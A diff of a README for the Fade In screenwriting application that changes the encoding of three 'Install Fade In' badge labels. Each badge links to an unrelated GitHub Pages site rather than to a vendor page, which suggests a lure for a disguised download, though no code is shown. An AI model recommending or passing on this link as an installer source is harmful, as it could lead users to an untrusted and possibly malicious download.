@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Fade In](https://img.shields.io/badge/⬇_Install_Fade%20In-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Fade In](https://img.shields.io/badge/⬇_Install_Fade+In-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Fade In is a professional screenwriting application offering industry-standard s
 
 <div align="center">
 
-[![⬇ Install Fade In](https://img.shields.io/badge/⬇_Install_Fade%20In-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Fade In](https://img.shields.io/badge/⬇_Install_Fade+In-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Fade In is a professional screenwriting application offering industry-standard s
 
 <div align="center">
 
-[![⬇ Install Fade In](https://img.shields.io/badge/⬇_Install_Fade%20In-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Fade In](https://img.shields.io/badge/⬇_Install_Fade+In-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
